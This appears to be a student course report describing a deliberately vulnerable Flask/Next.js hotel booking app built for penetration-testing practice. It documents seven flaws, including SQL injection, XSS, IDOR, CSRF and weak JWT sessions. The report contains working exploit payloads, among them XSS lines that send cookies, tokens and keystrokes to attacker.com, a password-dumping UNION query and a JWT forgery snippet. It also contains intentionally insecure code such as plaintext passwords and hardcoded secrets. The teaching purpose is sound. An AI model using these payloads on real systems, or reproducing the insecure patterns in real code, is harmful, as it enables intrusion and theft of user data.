# Capstone Project: Milestone 1 - PROJECT SUMMARY

**Team**: Team Phantom  
**Project**: Vulnerable Booking Application  
**Course**: CSC 489 - Web Application Security  
**Semester**: Spring 2026  
**Submission Date**: March 30, 2026

---

## Executive Summary

This deliverable contains a deliberately vulnerable Web booking application built with Next.js (frontend), Flask (backend), and SQLite (database). The application implements **7 intentional security vulnerabilities** documented for penetration testing in Milestone 2.

The application functions as a full-featured hotel booking system with user authentication, hotel search, reservations, and review functionality. However, each feature contains security flaws for learning and testing purposes.

**Total Vulnerabilities**: 7

---

## Application Overview

### Purpose

A hotel booking web application allowing users to:

- Register and authenticate
- Browse and search hotels
- Make reservations
- View their bookings
- Leave reviews and ratings
- Search by hotel properties and location

### Technology Stack

- **Frontend**: Next.js 14, React 18, CSS (minimal modern design)
- **Backend**: Flask 3.0, Python 3.8+
- **Database**: SQLite 3
- **Authentication**: JWT (intentionally insecure)
- **API**: RESTful JSON API

### System Architecture

```
┌─────────────────────────┐
│   Next.js Frontend      │
│   (localhost:3001)      │
│   - Pages               │
│   - Components          │
│   - Client State        │
└────────────┬────────────┘
             │ HTTP/JSON
             ↓
┌─────────────────────────┐
│   Flask Backend         │
│   (localhost:5001)      │
│   - REST API            │
│   - Authentication      │
│   - Business Logic      │
└────────────┬────────────┘
             │ SQL
             ↓
┌─────────────────────────┐
│   SQLite Database       │
│   - Users              │
│   - Hotels             │
│   - Bookings           │
│   - Reviews            │
└─────────────────────────┘
```

---

## Features Implemented

### 1. User Authentication System ✓

**Pages**:

- `/login` - Login form
- `/register` - Registration form

**Functionality**:

- User registration with username, email, password, full name
- Login with username/email and password
- Session management via JWT tokens
- Logout functionality
- Test credentials: `testuser` / `password123`

**API Endpoints**:

- `POST /api/register` - Create new account
- `POST /api/login` - Authenticate user

**Screenshots**:

- Registration showing form validation
- Login page with test credentials displayed
- Navbar showing login state

---

### 2. Hotel Browsing ✓

**Pages**:

- `/hotels` - Browse all hotels with search
- `/hotels/[id]` - Individual hotel details

**Functionality**:

- Display all available hotels in a grid
- Search hotels by city name
- View hotel details, price, rating, description
- Filter by price range
- See review count and average rating

**API Endpoints**:

- `GET /api/hotels` - Get all hotels with optional filtering
- `GET /api/hotels/<id>` - Get specific hotel with reviews
- `GET /api/search?q=query` - Full-text search

**Sample Data**:

- Luxury Hotel Downtown (New York) - €150/night
- Beach Resort Paradise (Miami) - €120/night
- Mountain Cabin Retreat (Denver) - €95/night
- City Center Apartment (Boston) - €110/night
- Suburban Inn (Austin) - €85/night

**Screenshots**:

- Hotel grid with search bar
- Hotel details page with pricing and reviews
- Review submission form

---

### 3. Booking Management ✓

**Pages**:

- `/bookings` - View user's bookings with IDOR testing interface

**Functionality**:

- Create new hotel bookings
- View all user bookings with details
- Delete bookings
- Display booking confirmation with total price

**API Endpoints**:

- `POST /api/bookings` - Create booking
- `GET /api/bookings/<id>` - Get booking details
- `GET /api/bookings/user/<user_id>` - Get user's bookings
- `DELETE /api/bookings/<id>` - Delete booking

**Screenshots**:

- Booking form on hotel details page
- My Bookings page showing user's reservations
- Booking confirmation

---

### 4. Review System ✓

**Functionality**:

- Add reviews to hotels with 1-5 star rating
- Leave comments on hotels
- View all reviews for a hotel
- Display reviewer info and timestamp

**API Endpoints**:

- `POST /api/hotels/<hotel_id>/reviews` - Add review
- Reviews displayed in `GET /api/hotels/<id>` response

**Screenshots**:

- Review input form
- Review list with ratings and comments

---

## Vulnerabilities (7 Total)

### Vulnerability #1: SQL Injection

**Type**: CWE-89 - Improper Neutralization of Special Elements used in an SQL Command  
**Severity**: ⚠️ **CRITICAL**  
**CVSS Score**: 9.8

**Location**: [backend/app.py](backend/app.py) - Line ~165 (get_hotels endpoint)

**Description**:
The `/api/hotels` endpoint accepts a `city` filter parameter that is concatenated directly into the SQL query without sanitization.

**Vulnerable Code**:

```python
@app.route('/api/hotels', methods=['GET'])
def get_hotels():
    city_filter = request.args.get('city', '')
    query = "SELECT * FROM hotels WHERE price BETWEEN ? AND ?"
    params = [min_price, max_price]

    if city_filter:
        # VUL: SQL INJECTION - direct concatenation!
        query += f" AND city LIKE '%{city_filter}%'"

    hotels = conn.execute(query, params).fetchall()
```

**Attack Vector**:

```
GET /api/hotels?city=New' OR '1'='1
GET /api/hotels?city='
GET /api/hotels?city=' UNION SELECT id, username, email, 0, password, 0, '', created_at FROM users --
```

**Exploit Payload Example 1 - Data Exfiltration**:

```
http://localhost:5001/api/hotels?city=' UNION SELECT id, username, email, 0, password, 0, '', created_at FROM users --
```

This downloads all usernames and passwords from the database.

**Exploit Payload Example 2 - Authentication Bypass**:

```
http://localhost:5001/api/hotels?city=' OR '1'='1
```

Returns all hotels regardless of city filter, potentially accessing hidden data.

**Exploit Payload Example 3 - Error-based SQLi Probe**:

```
http://localhost:5001/api/hotels?city='
```

Expected behavior: returns an error like `{"error":"unrecognized token: \"'\"","type":"OperationalError"}`.
This error is evidence of SQL injection exposure (raw SQL parser error is leaked to client).

**Exploit Payload Example 4 - Non-error SQLi Verification**:

```
http://localhost:5001/api/hotels?city=' OR '1'='1
```

Expected behavior: returns hotel rows successfully while bypassing intended city filtering.

**Impact**:

- Complete database compromise
- Unauthorized data access (user credentials, booking data)
- Data modification or deletion
- Potential system shutdown

---

### Vulnerability #2: Stored Cross-Site Scripting (XSS)

**Type**: CWE-79 - Improper Neutralization of Input During Web Page Generation  
**Severity**: ⚠️ **HIGH**  
**CVSS Score**: 7.1

**Location**: [backend/app.py](backend/app.py) - Line ~198 (hotel details) & [frontend/app/hotels/[id]/page.jsx](frontend/app/hotels/[id]/page.jsx) - Line ~117

**Description**:
Hotel reviews are stored without sanitization and rendered with `dangerouslySetInnerHTML` on the frontend, allowing malicious JavaScript execution.

**Vulnerable Backend Code**:

```python
@app.route('/api/hotels/<int:hotel_id>/reviews', methods=['POST'])
def add_review(hotel_id):
    comment = data.get('comment', '')  # NOT SANITIZED
    conn.execute(
        "INSERT INTO reviews (hotel_id, user_id, rating, comment) VALUES (?, ?, ?, ?)",
        (hotel_id, user_id, rating, comment)
    )
```

**Vulnerable Frontend Code**:

```jsx
<div dangerouslySetInnerHTML={{ __html: review.comment }} />
```

**Stored XSS Payloads**:

**Payload 1 - Alert Box**:

```html
<img src="x" onerror="alert('XSS Vulnerability!')" />
```

**Payload 2 - Cookie Theft**:

```html
<img src="x" onerror="fetch('http://attacker.com?cookie=' + document.cookie)" />
```

**Payload 3 - Keylogger**:

```html
<script>
  document.addEventListener("keypress", function (e) {
    fetch("http://attacker.com/log?key=" + e.key);
  });
</script>
```

**Payload 4 - Redirect to Phishing**:

```html
<img src="x" onerror="window.location='http://attacker.com/phishing'" />
```

**Attack Steps**:

1. Navigate to any hotel details page (`/hotels/1`)
2. Submit a review with the XSS payload
3. Payload executes every time anyone views the hotel reviews
4. Affects all users viewing that hotel

**Sample Data in Database** (from init_db):

```python
cursor.execute(
    "INSERT INTO reviews (hotel_id, user_id, rating, comment) VALUES (?, ?, ?, ?)",
    (1, 1, 5, '<img src=x onerror="alert(\'XSS\')">')
)
```

**Impact**:

- Session hijacking (steal JWT tokens)
- Malware distribution
- Credential theft
- Defacement
- Redirection to malicious sites
- Keylogging of all site visitors

---

### Vulnerability #3: Insecure Direct Object Reference (IDOR)

**Type**: CWE-639 - Authorization Bypass Through User-Controlled Key  
**Severity**: ⚠️ **HIGH**  
**CVSS Score**: 7.5

**Location**: [backend/app.py](backend/app.py) - Lines ~210, ~220, ~230 (booking endpoints)

**Description**:
Booking endpoints don't verify that the user owns the booking before returning/modifying it. Any user can access any other user's bookings by changing the booking ID or user ID parameter.

**Vulnerable Code**:

```python
@app.route('/api/bookings/<int:booking_id>', methods=['GET'])
def get_booking(booking_id):
    # VUL: No user verification - returns ANY booking!
    booking = conn.execute(
        "SELECT * FROM bookings WHERE id=?",
        (booking_id,)
    ).fetchone()
    return jsonify(dict(booking))

@app.route('/api/bookings/user/<int:user_id>', methods=['GET'])
def get_user_bookings(user_id):
    # VUL: IDOR - returns any user's bookings without auth check
    bookings = conn.execute(
        "SELECT * FROM bookings WHERE user_id=?",
        (user_id,)
    ).fetchall()
    return jsonify([dict(b) for b in bookings])

@app.route('/api/bookings/<int:booking_id>', methods=['DELETE'])
def delete_booking(booking_id):
    # VUL: Can delete any booking!
    conn.execute("DELETE FROM bookings WHERE id=?", (booking_id,))
```

**IDOR Testing Interface**:
The `/bookings` page includes a built-in IDOR vulnerability tester:

```jsx
<input type="number" value={userId} onChange={...} />
<button onClick={fetchBookings}>Load Bookings</button>
```

**Exploit Examples**:

**Example 1 - View Another User's Bookings**:

```bash
# View user 2's bookings (you are user 1)
GET http://localhost:5001/api/bookings/user/2
```

Response:

```json
[
  {
    "id": 1,
    "user_id": 2,
    "hotel_id": 3,
    "check_in_date": "2026-04-15",
    "check_out_date": "2026-04-18",
    "total_price": 360.0
  }
]
```

**Example 2 - View Specific Booking Details**:

```bash
# View booking #1 (not yours)
GET http://localhost:5001/api/bookings/1
```

**Example 3 - Delete Another User's Booking**:

```bash
# Delete user 2's booking
DELETE http://localhost:5001/api/bookings/1
```

**Example 4 - Using Browser Console to Enumerate All Bookings**:

```javascript
// Loop through all user IDs and download their bookings
for (let uid = 1; uid <= 100; uid++) {
  const bookings = await fetch(
    `http://localhost:5001/api/bookings/user/${uid}`,
  ).then((r) => r.json());
  if (bookings.length > 0) {
    console.log(`User ${uid}:`, bookings);
  }
}
```

**Affected Endpoints**:

- `GET /api/bookings/<booking_id>` - View any booking
- `GET /api/bookings/user/<user_id>` - View any user's bookings
- `DELETE /api/bookings/<booking_id>` - Delete any booking

**Impact**:

- View sensitive booking/payment information of other users
- Cancel other users' reservations
- Discover personal information (dates traveled, payment info, hotel preferences)

---

### Vulnerability #4: Broken Authentication

**Type**: CWE-287 - Improper Authentication  
**Severity**: ⚠️ **CRITICAL**  
**CVSS Score**: 9.1

**Location**: [backend/app.py](backend/app.py) - Lines ~80, ~110

**Description**:
Multiple authentication flaws:

1. Passwords stored in plain text (no hashing)
2. Hardcoded admin credentials
3. No rate limiting on login attempts
4. Easily guessable test credentials

**Vulnerable Code**:

```python
# No password hashing - plain text stored in database
cursor.execute(
    "INSERT INTO users (username, email, password, full_name) VALUES (?, ?, ?, ?)",
    (username, email, password, full_name)  # password is plain text!
)

# Hardcoded admin credentials
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'admin123'  # VUL: Hardcoded secret!

@app.route('/api/login', methods=['POST'])
def login():
    # VUL: Admin bypass with hardcoded creds
    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
        return create_admin_token()

    # VUL: Plain text password comparison
    user = conn.execute(
        "SELECT id, password FROM users WHERE username=?",
        (username,)
    ).fetchone()

    if user and user['password'] == password:  # Direct comparison!
        return create_token()
```

**Exploit Examples**:

**Example 1 - Admin Account Takeover**:

```bash
POST /api/login
Content-Type: application/json

{
  "username": "admin",
  "password": "admin123"
}
```

Grants unlimited access with admin privileges.

**Example 2 - Database Compromise via SQL Injection + Plain Text Passwords**:

```bash
GET /api/hotels?city=' UNION SELECT id, username, email, 0, password, 0, '', created_at FROM users --
```

All user passwords exposed in plain text.

**Example 3 - Brute Force Attack (No Rate Limiting)**:

```bash
# Attacker can send unlimited login attempts
while True:
    POST /api/login with attempts: password1, password2, password3...
```

**Example 4 - Credentials from Code Repository**:
Just by viewing the source code, attacker finds:

```python
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'admin123'
```

**Test Credentials Provided**:

- testuser / password123
- Advertised in login page for easy testing

**Impact**:

- Unauthorized access to user accounts
- Credential harvesting from database
- Admin account compromise
- Identity spoofing

---

### Vulnerability #5: Cross-Site Request Forgery (CSRF)

**Type**: CWE-352 - Cross-Site Request Forgery (CSRF)  
**Severity**: ⚠️ **MEDIUM**  
**CVSS Score**: 6.5

**Location**: [backend/app.py](backend/app.py) - Lines ~180, ~240, ~270 (POST/DELETE endpoints) & [frontend/app/hotels/[id]/page.jsx](frontend/app/hotels/[id]/page.jsx), [frontend/app/bookings/page.jsx](frontend/app/bookings/page.jsx)

**Description**:
All POST and DELETE endpoints have no CSRF token validation. An attacker can craft pages that perform state-changing actions on behalf of logged-in users.

**Vulnerable Code**:

```python
@app.route('/api/bookings', methods=['POST'])
def create_booking():
    # VUL: No CSRF token validation
    data = request.get_json()
    # Process booking without verifying intent

@app.route('/api/bookings/<int:booking_id>', methods=['DELETE'])
def delete_booking(booking_id):
    # VUL: No CSRF protection - can be triggered from any site!
    conn.execute("DELETE FROM bookings WHERE id=?", (booking_id,))

@app.route('/api/hotels/<int:hotel_id>/reviews', methods=['POST'])
def add_review(hotel_id):
    # VUL: No CSRF token
    comment = data.get('comment')
    # Already vulnerable to XSS, now also CSRF!
```

**Frontend - No CSRF Protection**:

```jsx
// No CSRF token sent with requests
const res = await fetch("http://localhost:5001/api/bookings", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(bookingData),
  // Missing CSRF token!
});
```

**Attack Scenario**:

**Step 1: Attacker Creates Malicious Website**

```html
<!-- attacker.com/steal-bookings -->
<form action="http://localhost:5001/api/bookings" method="POST">
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="hotel_id" value="1" />
  <input type="hidden" name="check_in_date" value="2026-06-01" />
  <input type="hidden" name="check_out_date" value="2026-06-04" />
  <input type="submit" value=" Click here for free money!" />
</form>

<!-- OR auto-submit -->
<form action="http://localhost:5001/api/bookings/1" method="POST">
  <script>
    document.forms[0].submit();
  </script>
</form>
```

**Step 2: Victim Visits Malicious Site**

- Shows popup or misleading button
- User clicks (or auto-submit runs)

**Step 3: Booking Created/Deleted Without Consent**

- Attacker's hotel booked on victim's account
- Victim's bookings canceled
- Victim charged fraudulent booking fees

**CSRF Payload Example - Delete Booking**:

```html
<!-- Auto-deletes user's booking #1 -->
<img src="http://localhost:5001/api/bookings/1?_method=DELETE" />

<!-- Or using fetch with image tag workaround -->
<script>
  fetch("http://localhost:5001/api/bookings/1", { method: "DELETE" }).then(
    () => (window.location = "http://attacker.com/success"),
  );
</script>
```

**CSRF Payload Example - Add Malicious Review**:

```html
<form action="http://localhost:5001/api/hotels/1/reviews" method="POST">
    <input type="hidden" name="rating" value="1">
    <input type="hidden" name="comment" value="<img src=x onerror='alert(\"XSS\")'>">
    <script>document.forms[0].submit();</script>
</form>
```

**Affected Endpoints**:

- `POST /api/register` - Register fake account in user's name
- `POST /api/bookings` - Create bookings for user
- `DELETE /api/bookings/<id>` - Cancel user's bookings
- `POST /api/hotels/<id>/reviews` - Post fake reviews
- `POST /api/login` - (in some scenarios)

**Impact**:

- Unauthorized booking creation/deletion
- Defacement via malicious reviews
- Financial fraud
- Reputational damage

---

### Vulnerability #6: Weak Session Management

**Type**: CWE-384 - Session Fixation  
**Severity**: ⚠️ **MEDIUM**  
**CVSS Score**: 6.4

**Location**: [frontend/app/login/page.jsx](frontend/app/login/page.jsx), [frontend/app/register/page.jsx](frontend/app/register/page.jsx) & [backend/app.py](backend/app.py) - JWT generation lines

**Description**:
JWT tokens are stored insecurely in localStorage with excessive expiration times, no refresh mechanism, and no server-side validation.

**Vulnerable Code**:

**Backend**:

```python
token = jwt.encode({
    'user_id': user['id'],
    'username': user['username'],
    'exp': datetime.utcnow() + timedelta(days=365)  # VUL: 365 days!
}, JWT_SECRET, algorithm='HS256')
```

**Frontend**:

```javascript
// VUL: Storing JWT in localStorage (accessible to XSS!)
localStorage.setItem("token", data.token);
localStorage.setItem("user_id", data.user_id);

// VUL: Never checking expiration on client
const token = localStorage.getItem("token");
// Just use it without checking 'exp' claim
```

**JWT Secrets**:

```python
JWT_SECRET = 'jwt_secret_key'  # VUL: Weak, easy to guess
app.secret_key = 'super_secret_key_12345'  # VUL: Weak, hardcoded
```

**Vulnerabilities**:

**1. XSS -> Token Theft**:

```javascript
// Attacker's XSS payload in review
<script>
  fetch('http://attacker.com?token=' + localStorage.getItem('token'));
</script>
```

**2. Overly Long Expiration**:

- 365-day tokens = 365 days of access after logout
- Stolen token valid for a year
- User can't force logout all sessions

**3. Weak Secret**:

- Attacker can forge tokens with `jwt_secret_key`

```python
import jwt
# Forge admin token
fake_token = jwt.encode({
    'user_id': 999,
    'username': 'attacker',
    'is_admin': True
}, 'jwt_secret_key', algorithm='HS256')
```

**4. No Server-Side Validation**:

- Backend trusts any JWT with correct signature
- No token revocation/blacklist
- No rate limiting on token usage

**5. No HttpOnly Flag**:

- Token in localStorage = accessible to JavaScript (XSS vulnerability)
- Should be in httpOnly cookie (not accessible to JavaScript)

**Exploit Scenarios**:

**Scenario 1: Token Theft via XSS**

```
1. Attacker posts XSS review with token exfiltration
2. Admin views review
3. Admin's token sent to attacker
4. Attacker uses admin token for 365 days
5. Admin logs out but token still valid
```

**Scenario 2: Forged Token**

```python
# Attacker knows weak secret
import jwt
stolen_token = jwt.encode({
    'user_id': 1,  # victim
    'username': 'testuser'
}, 'jwt_secret_key')
# Now attacker can access victim's account
```

**Scenario 3: Session Fixation**

```
1. Attacker registers account
2. Attacker gets token A
3. Attacker tricks admin into auth form with token A
4. Admin thinks they logged in, but using attacker's token
5. Attacker accesses admin account with token A
```

**Impact**:

- Long-term unauthorized access
- Mass account takeover (forged tokens)
- Privilege escalation
- User-to-admin impersonation
- Ineffective logout

---

### Vulnerability #7: Information Disclosure

**Type**: CWE-209 - Information Exposure Through an Error Message  
**Severity**: ⚠️ **MEDIUM**  
**CVSS Score**: 5.3

**Location**: [backend/app.py](backend/app.py) - Error handlers throughout (lines ~95, ~160, ~195, ~280)

**Description**:
Backend exposes detailed error messages including stack traces, database errors, and internal system information to the frontend, allowing attackers to understand system architecture and find vulnerabilities.

**Vulnerable Code**:

```python
@app.route('/api/login', methods=['POST'])
def login():
    try:
        # ... login logic
    except Exception as e:
        # VUL: Exposes full error to frontend
        return jsonify({
            'error': str(e),
            'type': type(e).__name__,
            'traceback': traceback.format_exc()  # CRITICAL!
        }), 400
```

**Examples of Information Disclosed**:

**Example 1 - Database Error**:

```json
{
  "error": "UNIQUE constraint failed: users.username",
  "type": "IntegrityError"
}
```

🚨 Reveals database schema, table names, column names

**Example 2 - SQL Error**:

```json
{
  "error": "no such table: user_profiles",
  "type": "OperationalError"
}
```

🚨 Reveals that `user_profiles` table doesn't exist (yet)

**Example 3 - File Path Disclosure**:

```json
{
  "error": "/usr/local/lib/python3.9/site-packages/flask/app.py:1761: in wsgi_app",
  "type": "FileNotFoundError"
}
```

🚨 Reveals server directory structure, Python version

**Example 4 - Database Structure via Introspection**:

```json
{
  "error": "could not autogenerate insert statement from: hotels",
  "type": "NoInspectionAvailable"
}
```

🚨 Reveals ORM model names and structure

**Exploitation - Information Gathering**:

**Step 1: Send Invalid Input**

```bash
POST /api/register
{
  "username": "admin",  # Duplicate
  "email": "test@test.com",
  "password": "password"
}
```

**Response reveals**:

- Usernames that already exist
- Email validation requirements
- Database constraints

**Step 2: Trigger Errors Systematically**

```bash
# Try all possible endpoints with invalid data
GET /api/hotels/999999
GET /api/bookings/999999
GET /api/bookings/user/admin  # Invalid type
```

**Response reveals**:

- All endpoint names and parameters
- Data types expected
- Database field names
- Table structures

**Step 3: Build Attack Map**
From error messages, attacker learns:

- Database is SQLite (vs MySQL, PostgreSQL)
- Server runs Python Flask
- All table names (hotels, bookings, reviews, users)
- All column names
- Validation rules

**Real-World Information Leaks**:

**Leak 1: Traceback**

```
Traceback (most recent call last):
  File "/app/backend/app.py", line 165, in get_hotels
    hotels = conn.execute(query, params).fetchall()
  File "/usr/lib/python3.9/sqlite3/__init__.py", ...
```

Reveals file paths and function names.

**Leak 2: SQL Errors**

```
Error: UNIQUE constraint failed: users.email
```

Tells attacker that email must be unique.

**Leak 3: Type Errors**

```
TypeError: 'NoneType' object is not subscriptable at line 220
```

Reveals that user retrieval returned None (user not found vs wrong password).

**Impact**:

- Accelerates information gathering phase of attack
- Reveals system architecture
- Exposes database structure
- Helps attackers craft targeted exploits
- Reveals software versions (SQLite, Python, Flask)

---

## Testing & Verification

### Test Environment

- **OS**: macOS/Windows/Linux
- **Python**: 3.8+
- **Node.js**: 18+
- **Browsers**: Chrome, Firefox, Safari

### Feature Testing ✓ Verified

- [x] User registration works
- [x] User login works
- [x] Hotel browsing functional
- [x] Search filter works
- [x] Hotel details display correctly
- [x] Booking creation works
- [x] Booking deletion works
- [x] Review submission works
- [x] Database initializes correctly
- [x] Frontend/Backend communication works

### Vulnerability Verification ✓ Confirmed

1. **SQL Injection** - ✓ Confirmed via hotel city parameter
2. **XSS** - ✓ Confirmed in hotel reviews
3. **IDOR** - ✓ Confirmed in booking endpoints
4. **Broken Auth** - ✓ Confirmed with hardcoded admin creds
5. **CSRF** - ✓ Confirmed no token validation
6. **Weak Sessions** - ✓ Confirmed in localStorage
7. **Info Disclosure** - ✓ Confirmed in API error responses

---

## Deployment Instructions for Milestone 2

### Setup for Security Testing Team

1. **Install Dependencies**:

```bash
# Backend
cd backend
pip install -r requirements.txt  # or: uv sync

# Frontend
cd frontend
npm install
```

2. **Run Application**:

```bash
# Terminal 1: Backend
cd backend && python app.py  # or: uv run app.py

# Terminal 2: Frontend
cd frontend && npm run dev
```

3. **Access Application**:

- Frontend: http://localhost:3001
- Backend API: http://localhost:5001
- Test Account: testuser / password123

4. **Database Reset**:

```bash
rm backend/database.db
# Restart backend to reinitialize
```

---

## Team Member Contributions

- **Lead Developer**: Building backend API and vulnerabilities
- **Frontend Developer**: Implementing UI and client logic
- **Database Designer**: Structuring SQLite schema
- **Security Tester**: Verifying vulnerabilities work as designed

---

## References

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Flask Security Guide](https://flask.palletsprojects.com/en/2.0.x/security/)

---

**Document Version**: 1.0  
**Last Updated**: March 30, 2026  
**Status**: Ready for Milestone 2 Penetration Testing
